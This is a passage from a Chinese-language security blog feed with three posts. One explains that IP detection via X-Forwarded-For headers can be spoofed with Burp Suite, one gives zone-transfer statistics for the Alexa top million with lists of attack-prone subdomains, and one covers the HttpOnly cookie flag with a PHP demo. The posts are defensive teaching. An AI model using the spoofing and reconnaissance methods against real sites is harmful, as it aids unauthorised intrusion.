&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;這是一個很基本的寫法、很正確的想法，如果 HTTP Header 中包含「Client-IP」，就先以他當作真實 IP。若包含「X-Forwarded-For」，則取他當作真實 IP。若兩者都沒有，則取「REMOTE_ADDR」變數作為真實 IP。因為當使用者連線時透過代理伺服器時，REMOTE_ADDR 會顯示為代理伺服器 Proxy 的 IP。部分代理伺服器會將使用者的原始真實 IP 放在 Client-IP 或 X-Forwarded-For header 中傳遞，如果在變數中呼叫則可以取得真實 IP。&lt;/p&gt;

&lt;p&gt;但是你知道嗎？&lt;strong&gt;網路上 80% 的教學寫法全部都是「錯誤」的。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;為什麼這樣說呢？請大家記得一件事情：「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;h3 id=&quot;竄改-http-header&quot;&gt;竄改 HTTP Header&lt;/h3&gt;

&lt;p&gt;「X-Forwarded-For」這個變數雖然「有機會」取得使用者的真實 IP，但是由於這個值是從客戶端傳送過來的，所以「有可能」被使用者竄改。&lt;/p&gt;

&lt;p&gt;舉例來說，我寫了一個小程式，偵測這些常見的 HTTP Header 判斷 IP。並且使用 &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; 這個工具來修改 HTTP Request。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;顯示目前 IP 以及相關 header&quot; title=&quot;顯示目前 IP 以及相關 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;頁面上顯示目前我目前的 IP「49.50.68.17」，並且其他的 header 是空的。但如果我今天使用 Burp Suite 之類的 Proxy 工具自行竄改封包，加上 X-Forwarded-For 或是 Client-IP header：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; title=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;修改完畢之後，再到原本的顯示 IP 介面，會發現網頁錯將我竄改的 header 當作正確的資料填入。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;顯示遭到竄改的 HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;使用代理伺服器-proxy-的情況&quot;&gt;使用代理伺服器 Proxy 的情況&lt;/h3&gt;

&lt;p&gt;使用代理伺服器的情況下，HTTP Header 會有不同的行為。例如 Elite Proxy 如何隱藏客戶端的真實 IP。以下簡單介紹幾種常見的狀況給各位參考。&lt;/p&gt;

&lt;h4 id=&quot;直接連線-沒有使用-proxy&quot;&gt;直接連線 （沒有使用 Proxy）&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 客戶端真實 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 客戶端真實 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 代理伺服器 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無 (或以逗點串接多個經過的代理伺服器 IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實際情況&quot;&gt;實際情況&lt;/h3&gt;

&lt;p&gt;在我們測試的過程中，通常我們都會讓瀏覽器自帶 X-Forwarded-For，並且自行填入 IP。常常會發現有一些網站出現如下的警告…&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! 顯示 IP 錯誤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;有沒有搞錯？「上次登入位置 127.0.0.1」？沒錯，這個是知名論壇套件「&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;」的功能，抓取 IP 的功能也是不安全的寫法。也有這樣的經驗，之前開著 X-Forwarded-For 的 header 到一些網站，竟然直接出現管理者後台！&lt;/p&gt;

&lt;p&gt;你覺得只有一般人撰寫的程式會有這樣的問題嗎？其實大型網站也可能會有類似的問題。這樣的寫法可能會讓管理者永遠抓不到犯罪者的真實 IP，甚至攻擊者可以竄改 header 插入特殊字元，對網站進行 SQL Injection 或者 Cross-Site Scripting 攻擊。&lt;/p&gt;

&lt;h3 id=&quot;正確又安全的方式&quot;&gt;正確又安全的方式&lt;/h3&gt;

&lt;p&gt;「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;p&gt;請各位開發者、管理者記住這個大原則，雖然這些 Request Header 可能含有真實 IP 的資訊，但是因為他的安全性不高，因此我們絕對不能完全信賴這個數值。&lt;/p&gt;

&lt;p&gt;那我們該怎麼處理呢？我的建議是記錄所有相關的 header 欄位存入資料庫，包含「REMOTE_ADDR」「X-Forwarded-For」等等，真正有犯罪事件發生時，就可以調出所有完整的 IP 資訊進行人工判斷，找出真正的 IP。當然從 header 存入的數值也可能會遭到攻擊者竄改插入特殊字元嘗試 SQL Injection，因此存入值必須先經過過濾，或者使用 Prepared Statement 進行存放。&lt;/p&gt;

&lt;p&gt;可以參考的 HTTP Header（依照可能存放真實 IP 的順序）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED&lt;/li&gt;
  &lt;li&gt;HTTP_X_CLUSTER_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED&lt;/li&gt;
  &lt;li&gt;REMOTE_ADDR (真實 IP 或是 Proxy IP)&lt;/li&gt;
  &lt;li&gt;HTTP_VIA (參考經過的 Proxy)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「駭客思維」就是找出網站任何可能竄改的弱點，從網頁上的元素到 HTTP Header 都是嘗試的對象。因此身為防禦者一定要清楚的知道哪些數值是不能信賴的，不要再參考網路上錯誤的教學了！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/19/client-ip-detection/</link>
                <guid>https://devco.re/blog/2014/06/19/client-ip-detection</guid>
                <pubDate>Thu, 19 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
                <description>&lt;h3 id=&quot;zone-transfer-世界大揭秘&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;

&lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;

&lt;h3 id=&quot;有問題的-domain-總數與比例&quot;&gt;有問題的 domain 總數與比例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133，約佔所有受測目標的 8.014%&lt;/li&gt;
  &lt;li&gt;上述 domain 的所有 zone file 共含有 22631804 筆 DNS 記錄&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於在 Alexa Top 1M 中有許多資料是重複的 domain，另外也有些資料是 IP，在本次的檢測當中都不列入計算，因此受測 domain 總數僅有 987447 個，而非一百萬個。另外，本次掃描為求快速犧牲了部分準確率，因此實際數量應比 79133 更多。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;有問題的-top-level-domain-tld-數量&quot;&gt;有問題的 Top-Level Domain (TLD) 數量&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;全世界 TLD 總數：567&lt;/li&gt;
  &lt;li&gt;受測目標的 TLD 總數：316，佔全世界總數的 55.73%&lt;/li&gt;
  &lt;li&gt;有 zone transfer 問題的 TLD 總數：220，佔受測目標的 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前 TLD 總數的數據取自於 &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;，不了解 TLD 是什麼的人可以參考&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;這篇維基百科文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;有趣的是，連一些新的 TLD 都有 zone transfer 問題，例如 .technology、.museum 等等，可見這真的很容易被大家忽略～&lt;/p&gt;

&lt;h3 id=&quot;關於各個-tld-的統計數據&quot;&gt;關於各個 TLD 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLD：在特定 TLD 中，有多少 domain 可任意執行 zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1M：特定 TLD 在本次 987447 個受測目標中所佔的數量&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1M：特定 TLD 在 Alexa top 1M 內所有同樣 TLD 所佔的百分比（例：.com 即為 35230 / 527203 = 6.68%）&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domain：某特定 TLD 可任意執行 zone transfer 的數量在本次所有可任意執行 zone transfer 所占的百分比（例：.com 即為 35230 / 79133 = 44.52%）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer 問題的 TLD 相關統計&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw 網域排第二十一名，幸好這次不是世界第一了，否則又是另類的台灣之光。&lt;/p&gt;

&lt;h3 id=&quot;關於-name-server-的統計數據&quot;&gt;關於 name server 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domain：該台 name server 有多少 domain 可任意執行 zone transfer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer 問題的 name server 相關統計&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可執行 zone transfer 且不重複的 namer server 共有 53830 個&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;關於-ip-位址的統計數據&quot;&gt;關於 IP 位址的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;有 7939172 個不重複的 IP 位址&lt;/li&gt;
  &lt;li&gt;在全部 IP 位址中，有 704638 個是私有 IP 位址&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 598443 個是 10. 開頭，佔所有 IP 位址的 7.538%，佔私有 IP 位址的 84.929%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 66270 個是 172.16~31 開頭，佔所有 IP 位址的 0.835%，佔私有 IP 位址的 9.405%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 39925 個是 192.168 開頭，佔所有 IP 位址的 0.503%，佔私有 IP 位址的 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-的統計數據&quot;&gt;subdomain 的統計數據&lt;/h3&gt;

&lt;p&gt;以下選出一些常被入侵者當作攻擊目標的 subdomain 來計算在 22631804 筆 DNS 記錄中分別各佔了幾筆，每個 subdomain 共有兩個統計結果，逗號左邊的統計結果代表以該 subdomain 開頭的 DNS 記錄，例如 git.devco.re。逗號右邊的統計結果則將前後有數字的 subdomain 也一併計入，例如 dns01.devco.re、01dns.devco.re、0dns001.devco.re 等等。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;版本控制&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;開發與測試&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;資料庫&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;後台管理&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;線上服務相關&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;私有服務&lt;/p&gt;

    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;按-end-的人有福了&quot;&gt;按 End 的人有福了&lt;/h3&gt;

&lt;p&gt;究竟經由 zone transfer 所得到的資料可以拿來做什麼？對於攻擊者而言，主要有以下三種利用方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;建立字典檔：入侵者可利用上述資料建立一份最常見的 subdomain 的字典檔，未來利用此字典檔進行掃描時可節省許多時間成本，快速檢測某間公司有哪些 subdomain&lt;/li&gt;
  &lt;li&gt;旁敲側擊：入侵者可觀察哪些 name server 有開放 zone transfer 查詢，接著去蒐集還有哪些公司使用同一台 name server，再進一步掃瞄那些 domain。那些 domain 也許不是大公司、不在 Alexa top 1M 內，但你無法確保它永遠不會是入侵者的攻擊目標。&lt;/li&gt;
  &lt;li&gt;結合 0day 進行攻擊：當某個第三方套件被揭露 0day 弱點時，擁有上述資料的人就可以迅速執行大範圍的攻擊。例如&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;這幾年正夯的 Rails 在去年被爆出有 Remote Code Exection 弱點 CVE-2013-0156&lt;/a&gt;，入侵者可直接對所有 redmine 進行攻擊。&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN 在今年也被揭露 Remote Code Execution 弱點&lt;/a&gt;，入侵者可找尋所有 vpn subdomain 來進行嘗試。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在上次我們提起這個古老的弱點後，已經有部分台灣企業陸續將此問題修復，但許多台灣企業仍有此問題而不自知，也許過陣子我們直接做個 Wall of Shame 條列出哪些廠商有問題會讓大家比較有感 :p&lt;/p&gt;

&lt;p&gt;不過也別急著笑台灣企業，許多國際級的大網站同樣也有此類問題。由此可見資安問題不分新舊、不分國內外，總是容易被大家忽略，等到不知不覺被入侵者捅了重重的一刀後，才驚覺這許多的小弱點一旦串起來是多麼的可怕。你，開始有所警覺了嗎？&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/</link>
                <guid>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</guid>
                <pubDate>Fri, 13 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HttpOnly - HTTP Headers 的資安議題 (3)</title>
                <description>&lt;p&gt;上次我們提到了 &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;

&lt;h3 id=&quot;httponly-簡介&quot;&gt;HttpOnly 簡介&lt;/h3&gt;

&lt;p&gt;Cookie 的概念雖然早在 1994 年就由 Netscape 的工程師 Montulli 提出，但當時仍未有完善的防護機制，像是 HttpOnly、Secure 等規範都是後來陸續被提出，直到 2011 年 4 月才在 &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; 中正式定案。而其中的 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; 是專門為了抵禦攻擊者利用 Cross-Site Scripting (XSS) 手法來盜取用戶身份，此項 Cookie 防護設定應該是在 HTTP Headers 系列文中最廣為人知的項目。&lt;/p&gt;

&lt;h3 id=&quot;httponly-主要作用&quot;&gt;HttpOnly 主要作用&lt;/h3&gt;

&lt;p&gt;說明 HttpOnly 主要作用之前，先談談 XSS 最常見的利用方式。XSS 攻擊早在 1990 年就被發現，此攻擊手法最常見的利用方式是存取使用者的 cookie 來獲得一些機敏資料。像是存取 session cookie 即可盜用使用者的身份（關於 session 的重要性，可以參考我們部落格的另一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session 攻擊與防護&lt;/a&gt;），如果在 cookie 中記錄了其他機敏資訊，也可能會一併遭竊。因此若能阻止攻擊者存取帶有敏感資料的 cookie，就能減少 XSS 對使用者的影響，因而催生了 HttpOnly 機制。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;當 cookie 有設定 HttpOnly flag 時，瀏覽器會限制 cookie 只能經由 HTTP(S) 協定來存取。因此當網站有 XSS 弱點時，若 cookie 含有 HttpOnly flag，則攻擊者無法直接經由 JavaScript 存取使用者的 session cookie，可降低使用者身份被盜用的機率。早期有些瀏覽器未完整實作 HttpOnly 所有功能，因此攻擊者仍可透過 XMLHttpRequest 讀取 cookie，但最近幾年各大瀏覽器也陸續阻擋了這個方式。因此 HttpOnly 可有效降低 XSS 的影響並提升攻擊難度。目前瀏覽器的支援列表如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly 瀏覽器支援列表&quot; title=&quot;HttpOnly 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其他瀏覽器支援列表以及各家程式語言使用 HttpOnly 的方式可參考 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;以下使用 PHP 程式碼為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;HttpOnly Demo&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;HttpOnly Demo&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;p&amp;gt;If you didn&amp;#39;t set HttpOnly flag, cookie will write down by document.write().&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            document.write(document.cookie);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; title=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在上圖中可看到 PHPSESSID 已成功被 JavaScript 存取，這也意味著網站有 XSS 弱點時，使用者的身份有較高的機率被盜用。為了使用 HttpOnly 進行防護，讓我們將 PHP 程式碼修改如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;session.cookie_httponly&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; title=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們可以使用畫面中右上角的 Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie 套件&lt;/a&gt; 看到 HttpOnly 已經被勾選（如紅框處），並且 PHPSESSID 已無法被 JavaScript 存取，不存在於 HTML 中。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前 PHP 官方的教學是用 session_set_cookie_params 這個 function，可參考&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;官方網頁的這篇說明&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly-實際使用案例&quot;&gt;HttpOnly 實際使用案例&lt;/h3&gt;

&lt;p&gt;由於 HttpOnly 的使用方式較簡單，因此僅列舉幾個站台的使用結果圖片給大家參考，就不另外多做說明囉！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;T客邦 (www.techbang.com)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

